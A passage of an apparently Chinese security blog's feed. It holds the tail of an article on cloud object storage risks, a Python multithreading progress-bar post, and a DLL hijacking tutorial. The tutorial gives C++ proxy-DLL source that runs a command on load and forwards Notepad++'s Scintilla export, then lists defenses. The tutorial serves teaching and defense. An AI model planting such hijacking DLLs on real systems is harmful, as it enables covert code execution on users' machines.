解析，那就可以利用<strong>任意文件上传</strong>进行 <strong>XSS</strong> <strong>钓鱼、挂暗链、挂黑页、供应链投毒</strong>等操作，常见的文件有<strong>SVG、html</strong>等文件，会被OSS解析。研发在使用对象存储时，需要根据业务需要在服务端先<strong>校验文件后缀类型</strong>，再校验Content-Type是否属与此后缀类型相匹配；储存方需要对文件后缀类型与文件MIME强关联，<strong>例如禁止jpeg后缀的文件MIME变成text/html。</strong></p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330095231355.png" alt="image-20230330095231355" style="zoom:50%;"><h3 id="内容安全"><a href="#内容安全" class="headerlink" title="内容安全"></a>内容安全</h3><p>除了常见的OSS应用安全之外，还有上传内容安全也值得注意。随着业务的急剧发展，上面的数据呈现爆炸式增长。上传大量的的视频、图片，这些日益增长的内容中充斥着各种不可控的风险因素，例如<strong>色情视频和图片、涉政暴恐内容、各种垃圾广告</strong>等。随着政府监管的日渐严格，<strong>网站及平台需要加强对网站内容的管理和检测。所以对于上传文件的输入点，需要接入风控进行审核</strong>。</p><h2 id="0x02-安全建设意见"><a href="#0x02-安全建设意见" class="headerlink" title="0x02 安全建设意见"></a>0x02 安全建设意见</h2><h3 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h3><p>使用加密技术对数据进行加密，保护数据的机密性和完整性。同时，应该确保加密密钥的安全性。</p><h3 id="强化身份认证"><a href="#强化身份认证" class="headerlink" title="强化身份认证"></a>强化身份认证</h3><p>采用多重身份认证方式，例如密码、短信验证码、生物识别等，以提高用户身份认证的安全性。</p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>采用访问控制策略控制用户对数据的访问权限，限制不必要的访问。</p><h3 id="数据备份和恢复"><a href="#数据备份和恢复" class="headerlink" title="数据备份和恢复"></a>数据备份和恢复</h3><p>建立相应的备份和恢复策略，以确保在出现故障或存在勒索行为时可以快速恢复数据。</p><h3 id="安全漏洞管理"><a href="#安全漏洞管理" class="headerlink" title="安全漏洞管理"></a>安全漏洞管理</h3><ol><li>采用网络安全技术，例如防火墙、入侵检测系统等，加强对OSS的网络安全保护。</li><li>建立安全漏洞管理机制，及时发现和修复潜在的安全漏洞，以减少安全风险。</li></ol><h3 id="安全监管"><a href="#安全监管" class="headerlink" title="安全监管"></a>安全监管</h3><p>建立安全监管机制，对企业的安全管理进行监管，确保企业的安全策略得到执行。</p><h3 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h3><p>定期对 OSS 进行安全审计，及时发现和修复潜在的安全漏洞。</p><h3 id="安全培训"><a href="#安全培训" class="headerlink" title="安全培训"></a>安全培训</h3><p>对员工进行安全培训，提高员工的安全意识和安全素养，降低因员工操作失误导致的安全问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    OSS服务作为一项重要的云上服务，承担了存储用户数据的重要功能。对象存储服务提供了细粒度的访问权限控制功能，以保证用户数据的安全性。&lt;strong&gt;如果使用OSS服务时安全意识不足或对访问权限以及访问策略错误理解，将会导致数据被非法访问或篡改，产生严重后果。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;本文将介绍下相关OSS云存储相关方面的风险问题，老规矩先上一张图。&lt;/p&gt;
&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230330091632227.png&quot; alt=&quot;image-20230330091632227&quot; style=&quot;zoom:50%;&quot;&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="OSS" scheme="http://www.ol4three.com/tags/OSS/"/>
    
      <category term="云存储" scheme="http://www.ol4three.com/tags/%E4%BA%91%E5%AD%98%E5%82%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python多线程实现进度条</title>
    <link href="http://www.ol4three.com/2022/06/07/WEB/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0%E8%BF%9B%E5%BA%A6%E6%9D%A1/"/>
    <id>http://www.ol4three.com/2022/06/07/WEB/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0%E8%BF%9B%E5%BA%A6%E6%9D%A1/</id>
    <published>2022-06-07T00:51:06.000Z</published>
    <updated>2023-03-07T01:22:48.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python多线程显示进度条的方式"><a href="#Python多线程显示进度条的方式" class="headerlink" title="Python多线程显示进度条的方式"></a>Python多线程显示进度条的方式</h1><p>使用python进行多线程任务时，有时需要获取及时进度来清晰的感知的任务进度，目前收集以下几种实用的方式。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230307090922846.png" alt="image-20230307090922846"></p><a id="more"></a><h2 id="使用-multiprocessing-进行记录"><a href="#使用-multiprocessing-进行记录" class="headerlink" title="使用 multiprocessing 进行记录"></a>使用 <code>multiprocessing</code> 进行记录</h2><p>利用 <code>callback</code>来检测每个任务的完成，返回值为主函数的return。<strong>apply_async(subprocess, args=(i,), callback=log)</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/23 14:15</span></span><br><span class="line"><span class="comment"># @Author  : zhouyuyao</span></span><br><span class="line"><span class="comment"># @File    : demon1.py</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">global</span> max</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">i</span>):</span></span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    flag =  flag + <span class="number">1</span></span><br><span class="line">    print(process_bar(flag, max))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_bar</span>(<span class="params">num, total</span>):</span></span><br><span class="line">    print(num,total)</span><br><span class="line">    rate = float(num)/total</span><br><span class="line">    ratenum = int(<span class="number">50</span>*rate)</span><br><span class="line">    r = <span class="string">&quot;[%s%s]&quot;</span> % (<span class="string">&#x27;&gt;&#x27;</span>*ratenum, <span class="string">&#x27; &#x27;</span>*(<span class="number">50</span>-ratenum))</span><br><span class="line">    <span class="comment">#r = f&quot;\\r[&#123;&#x27;&gt;&#x27;*ratenum&#125;&#123;&#x27; &#x27;*(30-ratenum)&#125; ](&#123;num,&#125;/&#123;total&#125;) &quot;</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subprocess</span>(<span class="params">number</span>):</span></span><br><span class="line">    <span class="comment"># 子进程</span></span><br><span class="line">    callback_res = <span class="string">&quot;call back&quot;</span></span><br><span class="line">    print(<span class="string">&#x27;这是第&#123;0&#125;个子进程&#x27;</span>.format(number))</span><br><span class="line">    pid = os.getpid()              <span class="comment"># 得到当前进程号</span></span><br><span class="line">    print(<span class="string">&#x27;当前进程号：&#123;0&#125;，开始时间：&#123;1&#125;&#x27;</span>.format(pid, datetime.now().isoformat()))</span><br><span class="line">    time.sleep(<span class="number">2</span>)                 <span class="comment"># 当前进程休眠30秒</span></span><br><span class="line">    print(<span class="string">&#x27;当前进程号：&#123;0&#125;，结束时间：&#123;1&#125;&#x27;</span>.format(pid, datetime.now().isoformat()))</span><br><span class="line">    <span class="keyword">return</span> callback_res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 主进程</span></span><br><span class="line">    print(<span class="string">&#x27;这是主进程，进程编号：&#123;0&#125;&#x27;</span>.format(os.getpid()))</span><br><span class="line">    t_start = datetime.now()</span><br><span class="line">    max = <span class="number">4</span></span><br><span class="line">    pool = multiprocessing.Pool(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        pool.apply_async(subprocess, args=(i,), callback=log)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    t_end = datetime.now()</span><br><span class="line">    print(<span class="string">&#x27;主进程用时：&#123;0&#125;毫秒&#x27;</span>.format((t_end - t_start).microseconds))</span><br></pre></td></tr></table></figure><h2 id="使用ProcessPoolExecutor-进行记录"><a href="#使用ProcessPoolExecutor-进行记录" class="headerlink" title="使用ProcessPoolExecutor 进行记录"></a>使用<code>ProcessPoolExecutor</code> 进行记录</h2><p><a href="https://www.cnblogs.com/goldsunshine/p/16878089.html">python 线程池 ThreadPoolExecutor</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, FIRST_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">second</span>):</span></span><br><span class="line">    print(second)</span><br><span class="line">    time.sleep(second)</span><br><span class="line">    <span class="keyword">return</span> second</span><br><span class="line"></span><br><span class="line">lists = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">all_task = []</span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">2</span>) <span class="keyword">as</span> pool:</span><br><span class="line">    <span class="keyword">for</span> second <span class="keyword">in</span> lists:</span><br><span class="line">        all_task.append(pool.submit(action, second))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(all_task):</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;future.result()&#125;</span> 返回&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;----complete-----&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="使用队列-queue-的方式进行返回"><a href="#使用队列-queue-的方式进行返回" class="headerlink" title="使用队列 queue 的方式进行返回"></a>使用队列 <code>queue</code> 的方式进行返回</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/23 14:15</span></span><br><span class="line"><span class="comment"># @Author  : zhouyuyao</span></span><br><span class="line"><span class="comment"># @File    : demon1.py</span></span><br><span class="line"><span class="keyword">import</span> queue,time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">url_queue</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> url_queue.empty():</span><br><span class="line">        url_list = url_queue.get()</span><br><span class="line">        i = url_list[<span class="number">0</span>]</span><br><span class="line">        num = url_list[<span class="number">1</span>]</span><br><span class="line">    print(i*<span class="number">30</span>)</span><br><span class="line">    print(<span class="string">f&quot;is Ok <span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url_queue = queue.Queue(maxsize=<span class="number">5</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    all_task = []</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">8</span>) <span class="keyword">as</span> pool:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            url_queue.put([url, num])</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            all_task.append(pool.submit(run, url_queue))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Python多线程显示进度条的方式&quot;&gt;&lt;a href=&quot;#Python多线程显示进度条的方式&quot; class=&quot;headerlink&quot; title=&quot;Python多线程显示进度条的方式&quot;&gt;&lt;/a&gt;Python多线程显示进度条的方式&lt;/h1&gt;&lt;p&gt;使用python进行多线程任务时，有时需要获取及时进度来清晰的感知的任务进度，目前收集以下几种实用的方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230307090922846.png&quot; alt=&quot;image-20230307090922846&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Code" scheme="http://www.ol4three.com/categories/Code/"/>
    
    
      <category term="Python" scheme="http://www.ol4three.com/tags/Python/"/>
    
      <category term="multiprocessing" scheme="http://www.ol4three.com/tags/multiprocessing/"/>
    
      <category term="ProcessPoolExecutor" scheme="http://www.ol4three.com/tags/ProcessPoolExecutor/"/>
    
      <category term="queue" scheme="http://www.ol4three.com/tags/queue/"/>
    
  </entry>
  
  <entry>
    <title>DLL劫持漏洞详解</title>
    <link href="http://www.ol4three.com/2022/05/29/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>http://www.ol4three.com/2022/05/29/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</id>
    <published>2022-05-29T06:41:33.000Z</published>
    <updated>2023-01-30T09:56:43.988Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-DLL是什么"><a href="#1-DLL是什么" class="headerlink" title="1.DLL是什么"></a>1.DLL是什么</h1><blockquote><p>DLL是Dynamic Link Library的缩写，意为动态链接库。在Windows中，许多应用程序并不是一个完整的<a href="https://baike.baidu.com/item/可执行文件?fromModule=lemma_inlink">可执行文件</a>，它们被分割成一些相对独立的动态链接库，即<a href="https://baike.baidu.com/item/DLL文件?fromModule=lemma_inlink">DLL文件</a>，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可有多个DLL文件，一个DLL文件也可能被几个应用程序所共用，这样的DLL文件被称为共享DLL文件。</p><p>1．静态调用方式：由<a href="https://baike.baidu.com/item/编译系统?fromModule=lemma_inlink">编译系统</a>完成对 DLL 的加载和应用程序结束时 DLL <a href="https://baike.baidu.com/item/卸载?fromModule=lemma_inlink">卸载</a>的编码（如还有其它程序使用该 DLL，则 Windows 对 DLL 的应用记录减1，直到所有相关程序都结束对该 DLL 的使用时才释放它，简单实用，但不够灵活，只能满足一般要求。</p><p>2．动态调用方式：是由编程者用 API 函数加载和<a href="https://baike.baidu.com/item/卸载?fromModule=lemma_inlink">卸载</a> DLL 来达到调用 DLL 的目的，使用上较复杂，但能更加有效地使用内存，是编制大型应用程序时的重要方式。</p></blockquote><a id="more"></a><h1 id="2-环境"><a href="#2-环境" class="headerlink" title="2.环境"></a>2.环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windwos Server 2012</span><br><span class="line">Windows 10</span><br><span class="line">Vs2019</span><br><span class="line">Procmon.exe</span><br><span class="line">notepad++ v6.6.6</span><br></pre></td></tr></table></figure><h1 id="3-漏洞原因"><a href="#3-漏洞原因" class="headerlink" title="3.漏洞原因"></a>3.漏洞原因</h1><p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。这就是所谓的DLL劫持。</p><p>DLL劫持漏洞翻译成英文叫做 DLL Hijacking Vulnerability，CWE将其归类为Untrusted Search Path Vulnerability。如果想要去CVE数据库中搜索DLL劫持漏洞案例，搜索这两个关键词即可。可见DLL劫持额主要原因是目录搜索的问题，我们来看一下DLL的搜索目录</p><p>在<code>Windows XP SP2</code>之前，Windows查找DLL的目录以及对应的顺序如下：</p><ol><li>进程对应的应用程序所在目录；</li><li>当前目录（Current Directory）；</li><li>系统目录（通过 GetSystemDirectory 获取）；</li><li>16位系统目录；</li><li>Windows目录（通过 GetWindowsDirectory 获取）；</li><li>PATH环境变量中的各个目录；</li></ol><p>在<code>Windows XP SP2</code>之后，Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启），默认注册表为：<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code>，其键值为1，此时调用顺序如下：</p><ol><li>进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</li><li>系统目录（即%windir%system32）；</li><li>16位系统目录（即%windir%system）；</li><li>Windows目录（即%windir%）；</li><li>当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</li><li>PATH环境变量中的各个目录；</li></ol><p>而在Windows7及以上，系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：在HKLM的如下目录中</p><p><code>SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p><p>Win10中如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129162728524.png" alt="image-20230129162728524"></p><p>同样，我们在WIN7的测试系统中也存在这个选项</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129162827261.png" alt="image-20230129162827261"></p><h1 id="4-DLL劫持漏洞分析"><a href="#4-DLL劫持漏洞分析" class="headerlink" title="4.DLL劫持漏洞分析"></a>4.DLL劫持漏洞分析</h1><blockquote><p>上文已经写明了DLL漏洞的成因，对dll劫持主要检测目录里的一些调用情况，通过一些监控软件，例如procmon，procmon全称为Process Monitor ，是一款能够实时显示文件系统、注册表与进程活动的高级工具，是微软推荐的一个系统监视工具。它整合了旧的 Sysinternals 工具，Filemon 与 Regmon，并增加了进程ID、用户、进程可靠度、等等监视项，可以记录到文件中。它的强大功能足以使 Process Monitor 成为你系统中的核心组件以及病毒探测工具。通常在病毒分析中会使用这个工具来监控软件的各种行为，同样也可以使用一些其他的行为监控软件来分析软件的行为，从而确定哪个dll可以劫持。</p></blockquote><h2 id="劫持应用中没有的dll"><a href="#劫持应用中没有的dll" class="headerlink" title="劫持应用中没有的dll"></a>劫持应用中没有的dll</h2><p>这里dll劫持的选用的是notepad++,使用的版本为6.6.6</p><p>下载：<a href="https://notepad-plus-plus.org/downloads/v6.6.6/">notepad++ v6.6.6</a></p><p>打开Process Monitor，设置几个过滤条件后，启动notepad</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129164531217.png" alt="image-20230129164531217"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129164518707.png" alt="image-20230129164518707"></p><blockquote><p><code>LoadLibrary</code>和<code>LoadLibraryEx</code>一个是本地加载，一个是远程加载，如果DLL不在调用的同一目录下，就可以使用<code>LoadLibrary(L&quot;DLL绝对路径&quot;)</code>加载。但是如果DLL内部又调用一个DLL，就需要使用<code>LoadLibraryEx</code>进行远程加载，语法如下</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">LoadLibraryEx(“DLL绝对路径”, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);</span><br></pre></td></tr></table></figure><p><code>LoadLibraryEx</code>的最后一个参数设置为<code>LOAD_WITH_ALTERED_SEARCH_PATH</code>即可让系统dll搜索顺序从我们设置的目录开始</p></blockquote><p>打开VS2022创建一个动态链接库</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129165326378.png" alt="image-20230129165326378"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        system(&quot;calc&quot;);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并复制到NotePad++目录下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129165659940.png" alt="image-20230129165659940"></p><p>启动Notepad++</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129171953319.png" alt="image-20230129171953319"></p><h2 id="劫持应用中存在的dll"><a href="#劫持应用中存在的dll" class="headerlink" title="劫持应用中存在的dll"></a>劫持应用中存在的dll</h2><p>修改条件为<code>Result is SUCCESS</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129173831019.png" alt="image-20230129173831019"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129173956888.png" alt="image-20230129173956888"></p><p>在动态调用的时候，一般代码通过loadlibrary去加载dll 并作为参数传到到导出函数，这里看一下导入表，发现他这里有一个导出函数</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129174446670.png" alt="image-20230129174446670"></p><p>编写dll如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Scintilla_DirectFunction()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;calc.exe&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后放到notepad++目录</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130093827867.png" alt="image-20230130093827867"></p><p>运行发现报错，同时并没有弹出计算器</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130093921730.png" alt="image-20230130093921730"></p><p>这边我们使用dll进行转发，再生成一个恶意的dll执行代码，代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line"># include &quot;pch.h&quot;</span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        system(&quot;calc&quot;);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Scintilla_DirectFunction()</span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hDll &#x3D; LoadLibrary(L&quot;SciLexer_org.dll&quot;);</span><br><span class="line">    if (hDll)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;typedef 是定义了一个新的类型</span><br><span class="line">        &#x2F;&#x2F;DWORD是双字类型 4个字节,API函数中有很多参数和返回值是DWORD</span><br><span class="line">        &#x2F;&#x2F;定义了类型EXPFUNC，并且返回类型是DWORD的函数的指针</span><br><span class="line">        typedef DWORD(WINAPI* EXPFUNC)();</span><br><span class="line">        EXPFUNC expFunc &#x3D; NULL;</span><br><span class="line">        expFunc &#x3D; (EXPFUNC)GetProcAddress(hDll, &quot;Scintilla_DirectFunction&quot;);</span><br><span class="line">        if (expFunc)</span><br><span class="line">        &#123;</span><br><span class="line">            expFunc();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换并将原DLL修改为<code>SciLexer_org.dll</code> 即可触发</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130095024990.png" alt="image-20230130095024990"></p><h2 id="使用工具进行劫持"><a href="#使用工具进行劫持" class="headerlink" title="使用工具进行劫持"></a>使用工具进行劫持</h2><p>使用CFF_EXPLORER、Process Explorer、Windbg来查找加载DLL,</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130170504078.png" alt="image-20230130170504078"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130170622223.png" alt="image-20230130170622223"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130171026673.png" alt="image-20230130171026673"></p><p>找一个不在<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code>路径里面的dll进行劫持，因为在这个路径里面的dll是优先加载的，加载之后已经进入内核空间，想要劫持难度很大。</p><p>确定DLL后可以直接使用<code>Alternate DLL Analyzer</code>分析导出函数。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130172201291.png" alt="image-20230130172201291"></p><p>同时使用<code>AheadLib</code>生成转发DLL的CPP文件即可。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130172329886.png" alt="image-20230130172329886"></p><p>我们可以直接在VS2019中创建动态链接库并加入我们想要执行的命令即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line"># include &quot;pch.h&quot;</span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 导出函数</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;EXPORT:Scintilla_DirectFunction&#x3D;SciLexerOrg.Scintilla_DirectFunction,@1&quot;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 入口函数</span><br><span class="line">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class="line">&#123;</span><br><span class="line">if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line">system(&#39;calc&#39;);</span><br><span class="line">DisableThreadLibraryCalls(hModule);</span><br><span class="line">&#125;</span><br><span class="line">else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译替换运行即可。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130172756059.png" alt="image-20230130172756059"></p><h2 id="部分自动化工具"><a href="#部分自动化工具" class="headerlink" title="部分自动化工具"></a>部分自动化工具</h2><p>目前使用效果都不是很好，更多的还是需要手工分析。</p><p><a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130175427781.png" alt="image-20230130175427781"></p><p><a href="https://github.com/sensepost/rattler">https://github.com/sensepost/rattler</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130175307769.png" alt="image-20230130175307769"></p><h1 id="5-如何防御"><a href="#5-如何防御" class="headerlink" title="5.如何防御"></a>5.如何防御</h1><ol><li>在加载DLL时尽量使用DLL的绝对路径；</li><li>调用SetDllDirectory(L””)把 当前目录 从DLL搜索目录中排除；</li><li>使用 LoadLibraryEx 加载DLL时，指定 LOADLIBRARY_SEARCH 系列标志；</li><li>此外，进程也可以尝试去验证DLL的合法性，例如是否具有自家的合法数字签名、是否是合法的系统DLL文件等。</li></ol>]]></content>
    
    <summary type="html">
    
